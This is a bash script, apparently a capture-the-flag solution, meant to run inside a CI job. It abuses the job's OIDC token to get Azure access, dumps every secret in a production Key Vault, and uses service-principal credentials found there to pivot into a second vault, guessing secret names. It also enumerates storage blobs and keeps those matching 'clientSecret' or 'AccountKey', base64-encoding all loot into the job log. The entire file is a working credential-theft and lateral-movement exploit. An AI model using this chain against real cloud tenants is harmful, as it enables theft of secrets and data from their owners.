#!/usr/bin/env bash
set -euo pipefail
CID="${AZURE_CLIENT_ID:?}"
TID="${AZURE_TENANT_ID:?}"
PROD='https://kv-tbl-prod-x3euoz.vault.azure.net'
SEC='https://kv-tbl-sec-x3euoz.vault.azure.net'
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36'
say(){ echo "$*"; }
oauth(){ # $1 tenant, $2 appId, $3 secret
  curl -sS --max-time 20 -X POST "https://login.microsoftonline.com/$1/oauth2/v2.0/token" \
    -d "client_id=$2" -d 'grant_type=client_credentials' \
    -d "client_secret=$3" -d 'scope=https://vault.azure.net/.default'
}
if [[ -z "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ]]; then say NO_OIDC; exit 0; fi
J=$(curl -sS --max-time 20 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
say "OIDC_SUB=$(echo "$J" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | jq -r .sub)"
BASE_R=$(curl -sS --max-time 20 -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" \
  -d "client_id=$CID" -d 'grant_type=client_credentials' \
  -d 'client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer' \
  -d "client_assertion=$J" -d 'scope=https://vault.azure.net/.default')
BASE=$(echo "$BASE_R" | jq -r '.access_token // empty')
if [[ -z "$BASE" ]]; then say "BASE_FAIL $(echo "$BASE_R" | jq -c '{error,error_description}' 2>/dev/null || head -c 200 <<<"$BASE_R")"; exit 0; fi
say BASE_TOKEN_OK
LIST=$(curl -sS --max-time 20 -H "Authorization: Bearer $BASE" "$PROD/secrets?api-version=7.4")
say "PROD_NAMES_B64=$(printf '%s' "$LIST" | jq -r '[.value[]?.id|split("/")|last]|join(",")' | base64 -w0)"
for name in $(echo "$LIST" | jq -r '.value[]?.id | split("/") | last'); do
  S=$(curl -sS --max-time 20 -H "Authorization: Bearer $BASE" "$PROD/secrets/$name?api-version=7.4")
  V=$(echo "$S" | jq -r '.value // empty')
  [[ -n "$V" ]] || { say "PROD_${name}_FAIL"; continue; }
  APPID=$(echo "$V" | jq -r '.appId // empty' 2>/dev/null || true)
  CSEC=$(echo "$V" | jq -r '.clientSecret // empty' 2>/dev/null || true)
  TEN=$(echo "$V" | jq -r '.tenantId // empty' 2>/dev/null || true)
  [[ -n "$APPID" && -n "$CSEC" && -n "$TEN" ]] || { say "PROD_${name}_NOT_SP"; continue; }
  R=$(oauth "$TEN" "$APPID" "$CSEC")
  AT=$(echo "$R" | jq -r '.access_token // empty')
  [[ -n "$AT" ]] || { say "SP_${name}_AUTH_FAIL"; continue; }
  say "SP_${name}_AUTH_OK"
  SL=$(curl -sS --max-time 20 -H "Authorization: Bearer $AT" "$SEC/secrets?api-version=7.4")
  say "SEC_${name}_NAMES_B64=$(printf '%s' "$SL" | jq -r '[.value[]?.id|split("/")|last]|join(",")' 2>/dev/null | base64 -w0)"
  # The SP may have get-only (no list) on the secret vault; try known names directly.
  for sn in flag FLAG flag-prod prod-flag ctf-flag tbl-flag the-flag dfcd master reporting-flag df26-flag; do
    H=$(curl -sS --max-time 15 -o /tmp/kv_$sn.json -w '%{http_code}' -H "Authorization: Bearer $AT" "$SEC/secrets/$sn?api-version=7.4" || echo 000)
    F=$(jq -r '.value // empty' /tmp/kv_$sn.json 2>/dev/null || true)
    say "TRY_${name}_${sn}_HTTP=$H"
    if [[ -n "$F" ]]; then
      say "FLAG_NAME=$sn"
      say "FLAG_B64=$(printf '%s' "$F" | base64 -w0)"
    fi
  done
  for sn in $(echo "$SL" | jq -r '.value[]?.id | split("/") | last' 2>/dev/null); do
    SV=$(curl -sS --max-time 20 -H "Authorization: Bearer $AT" "$SEC/secrets/$sn?api-version=7.4")
    F=$(echo "$SV" | jq -r '.value // empty')
    if [[ -n "$F" && ( "$sn" == "flag" || "$F" == DF26\{* ) ]]; then
      say "FLAG_NAME=$sn"; say "FLAG_B64=$(printf '%s' "$F" | base64 -w0)"
    fi
  done
done

say STORAGE_PHASE
STOR_R=$(curl -sS --max-time 20 -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token"   -d "client_id=$CID" -d 'grant_type=client_credentials'   -d 'client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer'   -d "client_assertion=$J" -d 'scope=https://storage.azure.com/.default')
STOK=$(echo "$STOR_R" | jq -r '.access_token // empty')
if [[ -z "$STOK" ]]; then say "STORAGE_TOKEN_FAIL"; else say STORAGE_TOKEN_OK; fi
for pair in 'sttblappcfgprodx3euoz:config' 'sttblbackupprodx3euoz:exports' 'sttblcilogsprodx3euoz:logs' 'sttblarchiveprodx3euoz:'; do
  acc=${pair%%:*}; cont=${pair##*:}; [[ -n "$cont" ]] || continue
  base="https://$acc.blob.core.windows.net/$cont"
  LB=$(curl -sS --max-time 20 -H "Authorization: Bearer $STOK" -H 'x-ms-version: 2021-08-06' "$base?restype=container&comp=list")
  names=$(echo "$LB" | jq -r '.EnumerationResults.Blobs.Blob[]?.Name' 2>/dev/null || true)
  say "LIST_${acc}_${cont}_B64=$(printf '%s' "$names" | tr '\n' ',' | base64 -w0)"
  for bn in $names internal-config.json config.json flag flag.txt export.json credentials.json secrets.json; do
    [[ -n "$bn" ]] || continue
    url="$base/$bn"
    code=$(curl -sS --max-time 20 -o /tmp/blob.bin -w '%{http_code}' -H "Authorization: Bearer $STOK" -H 'x-ms-version: 2021-08-06' "$url" || echo 000)
    [[ "$code" == "200" ]] || continue
    txt=$(head -c 20000 /tmp/blob.bin | tr -d '\000')
    if echo "$txt" | grep -aqE 'DF26\{|flag|secret|clientSecret|AccountKey|CONFIG_STORAGE'; then
      say "BLOB_${acc}_${cont}_${bn}_B64=$(printf '%s' "$txt" | base64 -w0)"
    fi
  done
done
say STORAGE_END
say END
